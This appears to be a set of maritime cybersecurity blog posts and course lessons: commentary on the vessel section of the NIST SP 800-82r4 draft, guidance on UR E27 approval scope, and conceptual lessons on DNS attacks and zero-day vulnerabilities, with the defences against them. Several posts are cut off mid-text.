c: NIST Now Counts Ships as OT — An E26 Practitioner Reads SP 800-82r4 Section 2.5.4 NIST's new OT guide now has a section on ships. It explains well why vessels are hard to secure. What it leaves out is who is responsible over the ship's life, the criteria for design decisions, and the link to safety. Julius Shin Maritime Technical Consultant · Shipboard Cybersecurity & Compliance - LinkedIn : https://www.linkedin.com/in/abysstoinfinity In August 2026, the US Coast Guard (USCG) and the FBI boarded US-bound tankers to assess their OT. A month later, on 21 September, NIST released the initial public draft of SP 800-82 Rev.4 with a vessel section for the first time: 2.5.4 Maritime/Vessels.

In the same season that regulators stepped aboard, the US standards body wrote ships into its OT guide. SP 800-82r4 ipd, 21 Sep 2026 Section 2.5.4: about three pages No citations in the vessel section E26/E27 only in Appendix D Three missing layers Comments to sp800-82rev4@nist.gov I coordinate IACS UR E26/E27 compliance on newbuildings from the owner's side. These are my notes from reading the draft in that role: what stood out, what bothered me, and what I would like to say before comments close on 30 November. Treat them as field impressions rather than answers. 1. The regulators came aboard A few years ago I often heard "it won't reach OT" in meeting rooms. I hear it much less now.

My sense is that ransomware is moving from shore-side ship management systems toward the ship itself, and regulators are moving from document review to on-board inspection. Three scenes from recent years stand out to me. When What happened Key point Aug 2026 Two US-bound tankers, including VL Prosperity, suspected compromised Iran's Mehr news agency reported about 30 hours of lost communications while transiting the Strait of Gibraltar (not confirmed by US officials).

USCG and FBI boarded in the Gulf of Mexico on 21 and 24 August to assess OT and IT From Jul 2025 USCG cyber rule for the Marine Transportation System takes effect Immediate incident reporting; stricter PSC cyber scrutiny signalled for foreign-flag ships Jan 2023 DNV ShipManager ransomware Per DNV, 70 customers and about 1,000 vessels affected. Two months later, work to restore the full service was still ongoing What the tanker boardings made me think about Reading the Industrial Cyber report , what caught my eye was who went aboard.

According to the USCG statement on the 21 August boarding, the team included USCG law enforcement personnel, a USCG Cyber Protection Team (CPT), a vessel inspector and an FBI Cyber Action Team. The purpose was to assess the ship's OT and IT systems. No operational disruption or environmental impact was reported. Whether this was ransomware, and who was behind it, has not been confirmed. Even the 30-hour communications loss comes from Mehr, and the same report made quite specific claims, such as reduced engine cooling flow, that have not been verified.

A communications outage can also have mundane causes, such as a satellite link or equipment fault, so a plain communications failure is still possible. I think it is too early to cite this as a case of ship OT ransomware. Still, it left me with a different question. If an inspector comes aboard and says "show me the logs for this system" or "who approved this remote session", can we answer with the E26 documents we produced at delivery? We have drawings and test reports, but who holds the material that explains the actual state of the ship six months into operation? I do not have a clear answer yet.

The USCG rule is not just about US-flag ships At first I set it aside: our ships are not US-flagged. The USCG final rule was published on 17 January 2025 and took effect on 16 July 2025, and it applies to US-flagged vessels, Outer Continental Shelf (OCS) facilities and MTSA-regulated facilities. Looking at the implementation timeline again, though, it was not something to set aside.

▸ 16 July 2025: report reportable cyber incidents to the National Response Center (NRC) without delay ▸ 12 January 2026: cyber training for all personnel, repeated annually ▸ 16 July 2027: designate a Cybersecurity Officer (CySO), conduct a Cybersecurity Assessment, submit a Cybersecurity Plan for approval In the final rule, USCG requested comment on a possible two-to-five-year delay for US-flagged vessels, but as of September 2026 no delay has been adopted. In the same notice, USCG said it would scrutinise foreign-flag vessels more closely at port state control (PSC) for poor cyber management linked to ISM Code implementation.

It lists deficiencies, detention, denial of entry and movement controls by the Captain of the Port (COTP) as possible outcomes. For ships trading to the US, whatever their flag, I expect the same questions sooner or later. 2. What 800-82r4 Section 2.5.4 says Section 2.5.4 runs to about three pages. In my own words, it treats the ship as mobile OT whose responsibilities are spread across many parties, and then describes functional zones, architectural characteristics, and maritime-specific challenges and recommendations in turn. It includes one example architecture for a cargo vessel (Fig. 12). The draft announcement partly explains why it appears now.

The first listed change in this revision is an expanded introduction to OT sectors, and maritime vessels came in alongside BACS, water and wastewater, food and agriculture, freight rail, and IIoT and cloud convergence. NIST did not single out shipping. The ship got a seat as Rev.3's ICS-centred text was broadened sector by sector. Even so, as far as I know this is the first US federal technical document to describe ship OT in CSF 2.0 terms, and that felt like no small change. One thing bothered me, though. The section cites no sources at all. There is no E26/E27, no IMO document, and no source for Fig. 12.

Among the sector sections, only water and wastewater cites anything (SP 1800-45); the rest have no citations. Appendix D does link to the IMO guidelines, but to Rev.3, even though Rev.4 was already out in May 2026. The substantive difference between Rev.3 and Rev.4 is small (a second IAPH guideline added to the reference list, and paragraph 3.1 now cross-refers to the definition in 2.1 instead of repeating it), but not pointing to the current edition is a signal in itself. The content reads as if someone who knows ships wrote it, which made it all the more frustrating that I could not trace the basis.

Functional zones Zone Main components Bridge/Navigation AIS, ECDIS, GPS/GNSS, radar, weather data, VDR Propulsion and machinery Engine control, cooling, fuel management, boilers, thrusters, power management Safety and security Fire and gas detection, watertight door control, CCTV, PACS, PA/GA Cargo, ballast and power Loading computer, tank level gauging, ballast water management, power generation and distribution Engine control room Automation servers, historians, HMIs, workstations Shipboard business network Administrative PCs, maintenance systems, passenger support, crew welfare Ship-to-shore Ship-to-shore communication such as GMDSS Architectural characteristics ▸ Network topology and attack surface change with the operational phase (at sea, in port, in dry dock) ▸ Many OEMs share the shipboard OT network, and each needs access to manage its own components ▸ Multiple wireless paths: satellite, HF/VHF/UHF, cellular and Wi-Fi ▸ Emergency communications such as GMDSS, distress radio beacons and NAVTEX must stay up in distress ▸ Maritime protocols (NMEA 0183/2000, IEC 61162-450) and industrial protocols (Modbus, CAN bus) are in common use, and many of them lack native authentication or encryption Maritime-specific challenges and recommendations ▸ Mixed-criticality systems : strongly segment crew welfare and passenger networks from engine control and safety systems ▸ Interfacing

Accounts have to be created and removed every rotation, the ship may lack central identity management or rely on shared accounts, and so the draft recommends role-based access aligned to shipboard positions and cyber turnover briefings at crew change. That is hard to write unless you have sailed or watched a crew change up close. I had not seen it in other OT documents, and it made me curious who wrote it. 3. Where it overlaps with E26/E27, and where it is empty Anyone working on E26 who reads 2.5.4 keeps thinking "this is about us": zone segmentation, untrusted networks, remote access, USB, many OEMs on one ship. Yet E26/E27 appear nowhere in the body.

They are only links in the resource list in Appendix D, and that appendix is due to move to the web in the final version. After that, no link will remain. In the table below I also look at E27, the system-level requirements. The two documents are, of course, different in nature. E26 is an IACS Unified Requirement (UR) that each class society writes into its own rules, applying in principle to ships contracted for construction on or after 1 July 2024 (the exact scope and timing vary by society and ship type). 800-82r4 is voluntary guidance. One says "prove this"; the other says "here is why it is hard and how to think about it". So I put the overlaps and gaps into a table in my own way.

What 2.5.4 says Corresponding E26/E27 requirement Alignment Functional zones, segmentation of mixed-criticality systems E26 security zones and network segmentation, zone and conduit design High, but 2.5.4 has no criteria for zone boundaries and no conduit concept Interfacing with untrusted systems E26 boundary protection for untrusted networks High, though the term is not defined Dependency on remote access E26 remote access control, E27 security capabilities for remote sessions Medium.

2.5.4 only acknowledges the need; the level of control is left to the general text in 4.2.1.8 (Remote Access Controls) Insider threat, USB limits E26 control of mobile and portable devices, physical access High Crew rotation, position-based RBAC E26 user accounts and access control, handover to operation 2.5.4 is more concrete about operational reality Maritime protocols without authentication or encryption E27 communication integrity, authentication and other system security capabilities 2.5.4 only names the problem; E27 requires suppliers to solve it (none) E26 CBS categories (Category I–III per UR E22), asset inventory, deliverables by design, testing and delivery phase Not covered in 2.5.4 (none) E26 Respond: local independent control, fallback to a minimal risk condition Linked only conceptually to the analog backup and resilience design in 5.4 Two thoughts came after building the table.

First, as a piece that argues why ships are hard, 2.5.4 is quite good. I would hand it to an owner's IT team or a shipyard design team meeting E26 for the first time, as background. Second, if US stakeholders start making demands on the basis of 800-82, then every time we answer with E26 deliverables we will have to interpret afresh, because there is no clause-to-clause mapping. Who should build that mapping, I cannot say yet. 4. The space the document leaves empty Section 2.5.4 explains well why ships are hard. I covered the formal problem of missing sources above, so here I look only at content.

What remained after reading was not "a few items are missing" but "a whole layer is missing", three times over. No time axis Section 2.5.4 draws the ship in operation as a single snapshot. But a ship moves through design, construction, HAT, sea trials, delivery, operation and modification, and responsibility passes from the shipyard to the owner, then to the manager and rotating crews. The crew-change problem the document raises, and the handover of accounts, asset inventory and security settings at delivery, which is where things most often go wrong in practice, are both gaps created by the missing time axis.

Without saying who is responsible for what, and until when, "shared responsibility model" stays a declaration. No decision criteria The document goes as far as "strongly segment", "separate from untrusted systems" and "remote access is unavoidable". It gives no criteria for where to cut a zone, under what conditions to allow remote access, or what counts as sufficient segmentation. There is description, but no basis for judgement. In a design review, practitioners need criteria, not direction, and those criteria will differ between a cargo ship, a cruise ship and an LNG carrier. That the only example is a cargo ship is, in the end, the same problem.

No link to safety The last question for ship OT is "does the ship still get there safely if it is compromised?" Keeping steering and propulsion under manual control during a cyber incident is the core of E26 Respond, and 800-82r4 itself talks about a consequence-driven defence mindset in 2.3 and analog backups in 5.4. Yet 2.5.4 connects to neither. For me, the biggest gap is that the vessel section is not tied to the safety principles in its own document. Section 2.5.4 explains why ships are hard. It does not say who is responsible over the ship's life, by what criteria to decide, or how it keeps the ship safe. 5. What documents should come next These gaps cannot be filled by editing 2.5.4.

They need documents at a different layer. Matching the three layers above, what I picture also has three parts. Sector-specific derivative documents. Keep 800-82r4 as the parent, and publish separate documents per sector, such as vessels, rail and water, carrying detailed recommendations and decision criteria: zone segmentation criteria, remote access requirements, test items. SP 1800 series or a separate SP, the format does not matter. OT is one word, but ships and buildings differ just as much as they sound. The document structure should reflect that. Failing that, a sector reference map. Derivative documents take time.

Before then, simply adding at the end of each sector section a list of "the NIST documents and external standards to read first for this sector" would be enough as a first step. For ships, that would put the relevant 800-82r4 sections, E26/E27 and the IMO guidelines in one table. An explicit division of roles. NIST covers mindset and architecture, IACS

posts.t: What Should Be Included in the Scope of Approval or Conformity Verification? - UR E27 Response Strategies (6/12)
c: What Should Be Included Within the Scope of Approval or Conformity Verification? Article 6 of a 12-Part Series on UR E27 Strategies for Marine Equipment Suppliers ※ The product, system, and project examples described in this article are illustrative examples created to explain how the scope of UR E27 approval or conformity verification should be defined and managed.

Blue Horizonist (Lew) Maritime & Cyber Security Consultant · ISP Consultant The previous article distinguished among three approaches to responding to UR E27: Type Approval for repeatedly supplied products, project-specific conformity verification of the actual supply configuration, and confirmation of exemption or non-mandatory application. Whichever route is selected, the next step must answer one fundamental question — what exactly will be treated as a single product for the purpose of this approval or conformity verification? Defining only the product name and Model does not make the approval target sufficiently clear.
Even under the same product name, the Hardware Revision, OS, Firmware, Application, Third-Party components, Interfaces, and optional functions may differ.

For example, even if a certificate identifies the product as "Cargo Monitoring System Model A," it may still be difficult to determine whether the actual project supply configuration falls within the approval scope unless the following details are clearly defined: Exact Models and Revisions of the Server and Controllers OS, Firmware, and Application Versions Third-Party Software and major Libraries Included Gateways, Switches, and Engineering Laptops Enabled Ports, Protocols, and Services Whether remote access and Cloud connectivity are included The boundary between the product's internal Network and the vessel Network The Configuration tested during approval Items that may be changed and items requiring reassessment when changed Defining the approval scope is therefore not simply an exercise in preparing a product list.

It means fixing the product's functions, components, Versions, Interfaces, optional functions, and conditions of application as a single verifiable Product Configuration. This article defines that Product Configuration as the "product Baseline" and examines how it can be managed to prevent discrepancies between the actual project supply configuration and the approval scope. ※ In this article, "approval scope" includes not only the scope of Type Approval but also the scope reviewed by the classification society or shipyard during project-specific conformity verification.

The applicable classification society's Rules and Guidance should be consulted to confirm the required submissions and approval procedures. The original IACS UR E27 text and the latest information are available on the official IACS UR E27 page. 1 The Approval Scope Is Defined by the Claim Being Demonstrated, Not by the Product's Physical Enclosure It is easy to understand the approval scope as the equipment contained within a product Cabinet or Panel. From a cybersecurity perspective, however, the scope cannot be determined solely by physical boundaries.

A single Panel may contain components managed by different parties and subject to different responsibilities, including: An Application developed by the equipment manufacturer Third-Party PLCs and Switches A commercial Operating System Antivirus Software provided by the customer Firewall Rules configured by the shipyard Engineering Tools used by field Service Engineers An Interface connected to the vessel's common Remote Access Gateway Conversely, an Engineering Workstation or Gateway physically located outside the Panel may be difficult to separate entirely from the approval scope if it is essential for changing product settings or performing Software Updates.

The following question should therefore be asked when defining the approval scope: "Which Hardware, Software, settings, Interfaces, and procedures must be grouped into a single evaluation target to demonstrate that this product satisfies the applicable UR E27 requirements?" The approval scope is not merely the product's physical boundary. It is the boundary within which the manufacturer can claim conformity and support that claim with Evidence. 2 A Product Baseline Must Be Far More Specific Than a Product Name In this article, a product Baseline means the defined configuration state used as the basis for approval or conformity verification.
At a minimum, the product Baseline should cover the following six areas.

Area Key Information to Be Included in the Product Baseline Hardware Equipment name, manufacturer, Model, Part Number, Revision, and major Modules System Software OS, Firmware, Driver, Runtime, and Database Versions Application Product Application, PLC Logic, HMI Project, and configuration file Versions Third-Party Components Switches, Gateways, Antivirus Software, Libraries, Utilities, and Engineering Tools Interfaces Physical and logical Interfaces, connected systems, communication direction, Ports, Protocols, and Services Security Configuration Accounts, privileges, Hardening, Logging, Backup, Update, and remote access settings The product's functional description, installation Image, Checksum, test procedures, manuals, and support conditions should also be linked to this Baseline.

Completing a product Baseline does not merely mean that a component list has been prepared. It means that the design documents have been developed for that configuration, the security functions have been configured and tested, and the same configuration will be maintained throughout production and delivery. 3 Hardware Scope Should Include Supporting Components That Affect Security, Not Only Major Equipment Manufacturers often define the approved Hardware as major equipment such as Servers, PLCs, and HMIs.

The following supporting components, however, may also directly affect the product's cybersecurity: Managed Ethernet Switches Serial-to-Ethernet Gateways USB or SD Card Readers Remote Access Routers External Backup Storage Engineering Laptops Hardware Security Modules Wireless Communication Modules Service Ports Third-Party Network Adapters For example, an internal Switch may appear to be nothing more than a device that forwards data. If it provides a Web-based management Interface, a Default administrator account, SNMP, Telnet, or Firmware Update functions, it affects both the product's attack surface and its management responsibilities.

Whether Hardware should be included in the approval scope should therefore be determined by the following criteria rather than by its price or relative importance within the product: Is it necessary for the product to perform an essential function? Does it provide or potentially bypass a product security function? Can a user or Service Engineer change its settings? Does it create a connection path to another system? Could its removal or replacement change the test results? Does it require vulnerability and security Update management? If the answer to any of these questions is yes, the Hardware should either be included in the Baseline or clearly identified as an external dependency.

4 Software and Firmware Should Be Managed by Exact Version and Function, Not Merely as "Installed" A Software inventory stating only "Windows," "Linux," "PLC Firmware," or "HMI Software" is insufficient. Features, Default settings, vulnerabilities, and Log formats can differ depending on the Version and Patch level, even when the product name remains the same.

At a minimum, each Software and Firmware item should be linked to the following information: Product name and manufacturer Version and Build number Patch or Hotfix level Equipment on which it is installed Function performed within the product Installation path or Package identifier Update method Integrity verification method End-of-support date or current support status Whether it is included in the approval scope For example, recording the OS only as Windows 10 makes it difficult to determine the Edition, Build, security Patch level, and support status.

Similarly, a PLC Firmware update may retain the same Major Version while changing its authentication method, communication Services, or security settings through a Minor Version update. The purpose of managing Versions within the product Baseline is not merely to keep an inventory current. It is to identify which Version was used to design and test the security functions and determine whether the existing test results remain applicable after a Version change.

5 PLC Logic, HMI Projects, and Configuration Files Are Also Part of the Application Conventional Software inventories often include only installed executable files and Packages, while omitting PLC Logic, HMI Projects, and configuration files. In OT products, however, these items may determine the actual operating functions, privileges, communications, and safety-related behavior.

Even when the PLC Hardware and Firmware remain unchanged, a Logic modification may affect: Conditions under which control commands are permitted Input validation Alarm activation criteria Fail-safe behavior Data exchanged with upper-level systems The range of changes that can be made using an Engineering Tool Backup and Restore scope Changes to an HMI Project may also affect user roles, administrator menus, Alarm presentation, Log generation, and Maintenance screens.

The product Baseline should therefore include: PLC Program or Logic Version HMI Project Version Configuration File Version Date of change and change approver Relationship between the Source and executable versions Build or Compile results Checksum or Hash Applicable test results Differences from the previous Version It is not enough to state that the "Application Version is unchanged." The manufacturer should also be able to demonstrate that the installed Logic and configuration are identical to those used for testing.

6 Third-Party Components Do Not Disappear from the Supply Scope Simply Because the Manufacturer Did Not Develop Them Not every Hardware and Software component included in a product is developed by the equipment manufacturer. The use of commercial Operating Systems, Switches, Databases, Gateways, Antivirus Software, Open-Source Libraries, and Engineering Tools is common. However, Third-Party components cannot be excluded from the Baseline and responsibility boundaries merely because they were developed by another supplier.

If an equipment manufacturer selects, integrates, and supplies a component as part of its system, it should manage at least the following: Exact product name, Model, and Version Function performed within the product Applied security settings Method for identifying known vulnerabilities Source of Patches and Firmware Updates Compatibility testing method before Updates are applied Manufacturer support period Replacement product selection criteria Tests affected by a component change Certification or approval information for the component itself Suppose a Third-Party Switch is discontinued and replaced by a similar Model.

Even if the Port count and physical dimensions are identical, the Default Services, administrator authentication method, VLAN functions, Log generation capabilities, and Firmware support policies may differ. A statement such as "may be replaced with an equivalent product" is therefore insufficient. The manufacturer should define in advance which characteristics must remain equivalent for the existing approval and test results to remain valid. 7 Open-Source Libraries and Runtimes May Also Need to Be Included in the Baseline Internal Libraries or Runtimes may change even when the Version of the main Application remains unchanged.

Such changes may not create any visible difference in product functionality, but they can have a direct cybersecurity impact. Typical examples include: Web Server Libraries Cryptographic Libraries Java or .NET Runtimes Database Engines Remote Access Components Logging Frameworks Network Communication Libraries Embedded Linux Packages For example, even if the Application remains at Version 2.0, a change to the internal OpenSSL Library may affect cryptographic functions, vulnerabilities, and compatibility with other components. This does not mean that every Library must be listed on the certificate itself.

However, components that affect the product's security functions or vulnerability exposure should be traceable through an SBOM or an internal Software component inventory. The approval scope therefore requires a system capable of managing not only the externally visible Version but also the major dependent Software components that make up that Version. 8 Interfaces Are Not Outside the Approval Scope; They Are Essential to Defining Its Boundary External Interfaces should not be treated merely as matters outside the product when defining the approval scope.
Where the product connects to other systems and what communications it permits determine both the product's security design and its division of responsibilities.

Each Interface should be linked to the following information: Physical Interface type Connected system Communication direction Source and Destination Port, Protocol, and Service Data or commands exchanged Authentication and encryption methods Whether the connection is permanent or enabled only when required Whether the communication traverses an untrusted Network Functions that can be modified through the Interface Impact of connection failure or data manipulation Division of responsibilities between the product supplier and the shipyard For example, if a product supports Syslog forwarding, the product Baseline may include the Log Format, transmission Protocol, configuration method, and Local storage method.

The actual receiving Server address, Network path, and vessel-wide retention policy may instead be defined by the project-specific vessel security architecture. In this case, including the Interface in the approval scope does not mean that every external connection becomes part of the product. It means clearly defining what the product provides and guarantees at the Interface and what conditions must be provided by the vessel.

9 Optional and Disabled Functions Must Also Be Addressed Clearly Within the Approval Scope A product may include functions that can be activated optionally in addition to its basic functions: Remote Access Cloud Data Transmission Wireless Communication USB Updates Web Administration External Log Forwarding Mobile Application Integration Third-Party APIs Simply marking these functions as "Options" leaves the approval scope unclear.

Each function should be classified under one of the following arrangements: 1 Included in the approval scope and tested in an enabled state 2 Included in the approval scope but disabled by Default, with the activation conditions and configuration method verified 3 Excluded from the approval scope and either not installed or made unavailable 4 Added only f

posts.t: DNS Spoofing & DNS-based Attacks — Maritime Cybersecurity Learning (Lesson 13)
c: 📚 Series Maritime Cybersecurity Learning Roadmap | PART 2 Lesson 13 of 8 · Course Index → DNS Spoofing & DNS-based Attacks How DNS works · Cache Poisoning · DNS Hijacking · DNS Tunnelling · DNSSEC · DNS over HTTPS and TLS · Maritime VSAT DNS Risk — attacks that subvert the internet's naming system to redirect and intercept traffic.

Captain Paul Maritime Cybersecurity · IACS UR E26/E27 September 2026 🎯 Lesson Objective After this lesson you can explain how DNS resolution works, describe DNS cache poisoning and DNS hijacking attacks, explain what DNS tunnelling is and how it is used to bypass security controls, describe DNSSEC and how it defends against cache poisoning, explain DNS over HTTPS (DoH) and DNS over TLS (DoT), and identify the specific DNS security risks affecting maritime vessels over satellite communications links. Every internet connection begins with a DNS lookup.

When a browser, application, or operating system wants to connect to mail.example.com , it first asks the Domain Name System to resolve that name to an IP address. Only then does the actual connection begin. DNS is the telephone directory of the internet — an essential, distributed, globally replicated infrastructure that every networked device depends on dozens or hundreds of times per day. DNS was designed in 1983 for a small, trusted academic network. It was not designed with authentication, encryption, or integrity verification. A DNS response is taken at face value — there is no mechanism in classic DNS to verify that the answer received is genuine and not forged.

This fundamental design gap has been exploited in a variety of DNS-based attack techniques that redirect traffic, intercept communications, and exfiltrate data covertly. For maritime professionals, DNS attacks are particularly relevant in two contexts: the VSAT satellite link that ships use to communicate with the internet (where the DNS resolver configuration is controlled by the satellite service provider, and manipulation is possible at multiple points in the chain), and port network environments where crew devices may connect to networks with compromised DNS resolvers. 1.

How DNS Resolution Works — The Target When a device needs to resolve a domain name, the process follows a hierarchy of queries. The device's DNS resolver (usually the ISP or corporate resolver configured by DHCP) checks its local cache first. If not found, it queries the root servers (which delegate to the TLD servers for .com, .org, etc.), then the authoritative nameserver for the domain. The final authoritative answer — the IP address — is returned and cached locally for a period defined by the record's TTL (Time to Live).

DNS RESOLUTION CHAIN Device → Local Cache → Recursive Resolver Recursive Resolver → Root Server (which root?) Root Server → TLD Server (.com?) TLD Server → Authoritative NS (example.com?) Authoritative NS → IP Address: 93.184.216.34 Resolver → Device (cached for TTL seconds) Each of these steps transmits a UDP packet over port 53, unauthenticated and unencrypted in classic DNS. The DNS transaction ID (a 16-bit number) is supposed to match responses to requests, but in practice this provides minimal protection against a positioned or lucky attacker. 2.

DNS Attack Techniques DNS Attack Taxonomy DNS Cache Poisoning The attacker sends a forged DNS response that arrives before the legitimate response, injecting a false IP address into the resolver's cache. All users whose devices query that resolver then receive the forged address and connect to the attacker's server, believing it is the real destination. The Kaminsky Attack (2008) demonstrated this could be done in minutes with available tools by randomising the source port and transaction ID simultaneously. Cache poisoning affects all users of the compromised resolver until the TTL expires.

DNS Hijacking Rather than poisoning the cache, the attacker directly modifies DNS records at the authoritative source — either by compromising the domain registrar account (credential theft, social engineering), the DNS hosting provider, or a router whose DNS settings the attacker has modified. DNS hijacking at the registrar level is used in sophisticated supply chain and espionage campaigns to redirect all traffic for a domain to attacker-controlled infrastructure. DNS Tunnelling DNS queries are rarely blocked at the network perimeter — organisations that block HTTP and HTTPS outbound traffic often still allow DNS.

An attacker who has compromised an internal host can encode data in DNS queries (e.g. in subdomains) and exfiltrate it to an attacker-controlled nameserver, bypassing data loss prevention controls. DNS tunnelling is also used by malware for command-and-control (C2) communications. Detection requires DNS traffic analysis for anomalously long or frequent subdomains. DNS DDoS Amplification As discussed in Lesson 8, DNS is commonly abused as a DDoS amplification vector. A small DNS query (60 bytes) for a large record can produce a response of 3,000+ bytes — a 50× amplification factor.

Open DNS resolvers (those that respond to queries from any IP) are used to reflect and amplify traffic against a target by spoofing the source IP. 3. Defences — DNSSEC, DoH, and DoT 🔐 DNSSEC DNS Security Extensions add cryptographic signatures to DNS records. The authoritative nameserver signs each record with its private key; the resolver validates the signature using the corresponding public key, which is itself chained back to the root via a trust hierarchy. A poisoned or modified DNS response will fail signature validation and be rejected. DNSSEC is the definitive defence against cache poisoning and record modification in transit.

Limitation: DNSSEC does not encrypt DNS queries — it only authenticates records. It protects integrity but not confidentiality. Many domains have not deployed DNSSEC despite it being available. 🔒 DNS over HTTPS / DNS over TLS DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS queries between the client and the resolver, preventing eavesdropping on DNS traffic and on-path tampering. They protect against an attacker on the local network (port Wi-Fi, VSAT) who could otherwise observe and manipulate DNS queries in transit. Modern browsers support DoH natively; operating systems increasingly support DoT.

Maritime relevance: On VSAT links where the satellite provider operates the DNS resolver, DoH/DoT routes queries to a separate encrypted resolver, bypassing potential interception or manipulation at the provider level. Additional DNS Security Controls Registrar Account Security Protect domain registrar accounts with strong, unique passwords and MFA. DNS hijacking via registrar compromise is a common entry point for sophisticated attackers targeting an organisation's internet presence.

DNS Monitoring Monitor DNS traffic for anomalies: unusually long subdomain strings (tunnelling indicator), high volume of queries to unusual TLDs, queries to known malware C2 domains (via threat intelligence feeds), and unexpected changes to critical records. Recursive Resolver Configuration Use enterprise DNS resolvers that support DNSSEC validation, apply filtering (blocking known malicious domains), and are not exposed as open resolvers. Configure client devices to use only corporate DNS servers via DHCP enforcement, preventing use of attacker-configured resolvers on untrusted networks.

Block DNS Tunnelling Deploy DNS traffic analysis that flags anomalously long or high-frequency subdomain queries. Block DNS queries to external resolvers that bypass corporate DNS. Restrict outbound DNS to the corporate resolver so tunnelling traffic cannot reach an attacker-controlled nameserver. ⚓ Maritime DNS Risk — VSAT and Port Networks Vessels operating on VSAT links rely on the satellite service provider's DNS infrastructure. The resolver configuration is typically applied via DHCP from the satellite modem — the vessel's own IT department often has limited visibility into or control over which resolvers are used, or whether those resolvers perform DNSSEC validation.

In port, crew devices connecting to port Wi-Fi or cellular networks receive DNS configuration from the network operator. A compromised or attacker-controlled Wi-Fi access point can assign itself as the DNS resolver, positioning itself to intercept and redirect all DNS queries — and by extension, redirect all unencrypted or HTTPS-downgraded traffic to attacker-controlled servers. Recommended controls for maritime operators: Enforce DoH or DoT on company devices so DNS queries are encrypted regardless of the underlying network. Configure a corporate DNS resolver (e.g.

an always-on VPN that forces DNS through a company-controlled resolver) so the satellite provider or port network cannot intercept or manipulate DNS. Monitor DNS query logs from VSAT links for tunnelling indicators and unexpected record changes. ✍️ Author Insight — From the Field Captain Paul · Maritime Cybersecurity Consultant · IACS UR E26/E27 DNS security receives significantly less attention in maritime cybersecurity assessments than it warrants. During E26 CRSI assessments, it is common to find that vessel IT configurations rely entirely on the VSAT provider's DNS resolver with no DNSSEC validation, no DoH/DoT enforcement on end devices, and no DNS traffic monitoring capability.

The DNS resolver used by crew and officer laptops on board is often opaque to the ship's IT management. The DNS configuration question — "who resolves your DNS and how do you verify the responses are authentic?" — frequently yields a response along the lines of "we use whatever the VSAT provider gives us". This is not an unreasonable operational default, but it represents a gap in the security architecture: the vessel's entire internet connectivity, including access to company email, fleet management systems, and OEM remote support portals, is routed through a resolver whose integrity the operator has not verified.

Minimum recommended posture: Enforce always-on VPN with split-DNS disabled (all DNS through corporate resolver), configure corporate resolver to enforce DNSSEC validation, enable DNS query logging with alerting on anomalous patterns, and include DNS configuration review in the scope of annual cybersecurity assessments and VSAT contract negotiations. 🎉 PART 2 Complete Understanding Cyber Attacks — All 7 Lessons You have completed all seven lessons of PART 2.

You can now explain the core mechanisms of: Phishing & Social Engineering, Ransomware & the Cyber Kill Chain, DoS and DDoS Attacks, Man-in-the-Middle Attacks, SQL Injection, Cross-Site Scripting, and DNS-based Attacks — and their specific implications in maritime operational environments. Continue to PART 3 → ✅ Key Takeaways — Lesson 13 DNS translates human-readable domain names to IP addresses and was not designed with authentication or encryption. DNS Cache Poisoning injects false IP addresses into a resolver's cache, redirecting all users of that resolver to attacker-controlled servers.

DNS Hijacking modifies authoritative DNS records by compromising the registrar or DNS hosting account — protect these accounts with MFA. DNS Tunnelling encodes data in DNS queries to exfiltrate data or establish C2 channels, bypassing traditional firewall controls. DNSSEC adds cryptographic signatures that allow resolvers to detect tampered or poisoned DNS responses. DoH and DoT encrypt DNS queries between the client and resolver, preventing local network eavesdropping and on-path manipulation. Maritime vessels over VSAT should enforce corporate DNS via always-on VPN and audit the DNS configuration included in satellite service agreements.

📚 PART 2 — Understanding Cyber Attacks Done Lesson 6 — Phishing & Social Engineering Done Lesson 7 — Ransomware & the Cyber Kill Chain Done Lesson 8 — DoS and DDoS Attacks Done Lesson 9 — Man-in-the-Middle (MitM) Attacks Done Lesson 10 — SQL Injection Done Lesson 11 — Cross-Site Scripting (XSS) Done Lesson 12 — Zero-Day Vulnerabilities and Exploits Current Lesson 13 — DNS Spoofing & DNS-based Attacks ✅ PART 2 Complete — All 8 Lessons Finished ← Return to Course Index

posts.t: Zero-Day Vulnerabilities and Exploits — Maritime Cybersecurity Learning (Lesson 12)
c: 📚 Series Maritime Cybersecurity Learning Roadmap | PART 2 Lesson 12 of 8 · Course Index → Zero-Day Vulnerabilities and Exploits CVE Lifecycle · Zero-Day vs N-Day · Exploit Development · EternalBlue · Log4Shell · Virtual Patching · Maritime OT Exposure — software flaws unknown to the vendor, exploited before any defence exists.

Captain Paul Maritime Cybersecurity · IACS UR E26/E27 September 2026 🎯 Lesson Objective After this lesson you can explain what a zero-day vulnerability is and why it is uniquely dangerous, describe the CVE vulnerability lifecycle from discovery to patch, distinguish between zero-day and N-day exploits, identify real-world zero-day campaigns (EternalBlue, Log4Shell), explain why maritime OT systems face heightened zero-day risk, and describe the key defences — patch management, virtual patching, and network segmentation. Every vulnerability we have studied so far — SQL Injection, XSS, DoS, MitM — has a known name, a CVE number, documented attack patterns, and published defences.

Security teams can search for them, scan for them, and patch against them. A zero-day is none of those things. It is a flaw in software that its vendor does not yet know exists. There is no CVE. There is no patch. There is no signature in the IDS ruleset. The only people who know about it are the ones exploiting it — and the window between "found by an attacker" and "fixed by the vendor" can last months or years. The term comes from the developer's perspective: they have had zero days to fix it. For the attacker, that zero-day window is the most valuable time — defenders cannot patch what they do not know is broken, and detection tools cannot recognise what has no known signature.

Nation-state hacking groups pay millions of dollars for high-quality zero-days; vulnerability brokers (companies like Zerodium) publish buy prices publicly. A working zero-day for a major mobile OS can exceed USD 2.5 million. The maritime sector is particularly exposed. Vessels operate software stacks that are updated infrequently — sometimes years behind current versions — because patch deployment requires either a port stop or a satellite-delivered update cycle.

An attacker who discovers a zero-day in a widely deployed ECDIS platform or VSAT management interface has a window of exploitation that extends across an entire fleet, often for far longer than would be acceptable on a corporate network. 1. The Vulnerability Lifecycle — From Discovery to Patch A vulnerability passes through a predictable lifecycle, but the timing at each stage is unpredictable — and the phases where attackers hold the advantage can be long. Vulnerability Lifecycle — Key Phases 1 Discovery A researcher, attacker, or automated fuzzer finds a flaw. Depending on who finds it first, what happens next varies enormously.

Responsible researchers report to the vendor; malicious actors begin developing an exploit quietly. 2 Zero-Day Window (Pre-Disclosure) If the attacker found it first, the zero-day window begins. No CVE exists. No patch exists. Defenders have no knowledge of the vulnerability and no means to detect exploitation through conventional signature-based tools. This is the highest-value phase for attackers — and can last from days to years. 3 Disclosure & CVE Assignment The vulnerability is reported to the vendor (by a researcher, CERT, or in rare cases by the attacker selling it). A CVE identifier is assigned by MITRE. The vulnerability is now known — but still unpatched.

